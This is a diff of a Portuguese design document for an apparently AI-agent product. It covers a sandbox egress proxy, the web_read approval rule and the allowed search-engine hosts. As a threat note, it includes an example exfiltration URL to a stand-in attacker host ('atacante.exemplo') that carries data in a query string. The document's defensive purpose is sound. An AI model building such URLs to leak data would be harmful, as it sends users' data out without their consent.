@@ -67,7 +67,9 @@ Em desenvolvimento (worker no host): o proxy escuta no endereço do host na pont
 
 O proxy ganhou dois modos para isso (`packages/sandbox/src/egress/proxy.ts`, com testes): `openWeb` (qualquer **nome** público; o resto da regra continua: sem IP literal, só as portas, endereço resolvido público e conexão ao endereço validado) para o navegador do renderizador, e `anonymousSubject` (sem credencial, lista fixa) para o proxy de motores. Os bots nunca usam nenhum dos dois.
 
-**O que isto abre:** como a leitura pública não pede cartão, uma URL lida é um canal de saída (`https://atacante.exemplo/?dado=...`). Está em BUSCA.md, "O que isto NÃO impede".
+**O que isto abre, e o que fecha:** a URL lida é um canal de saída (`https://atacante.exemplo/?dado=...`). Por decisão do dono, `web_read` só abre **sem cartão** um endereço que já apareceu na execução (mensagem do usuário, resultado de busca, link de uma página lida; igualdade exata do endereço normalizado); qualquer outro é um cartão "Ler uma página nova: `<url>`" ([APROVACOES.md](APROVACOES.md), [BUSCA.md](BUSCA.md)).
+
+**Hosts de saída da busca.** A lista do proxy de motores é a união dos hosts **exatos** dos motores ligados (`engineHosts`, em `packages/web/src/engines.ts`), lidos no módulo de cada motor da imagem fixada. Com `duckduckgo` ligado entra **`html.duckduckgo.com`** e só ele (o módulo faz POST só aí; `duckduckgo.com` é usado apenas por uma função de manutenção offline e por outros motores, desligados). Google e Bing não existem na lista. **O Suup não burla proteção de site** (sem captcha resolvido, sem rodízio de IP ou de `User-Agent`): BUSCA.md, "Regra do dono".
 
 ## Conectores stdio
 
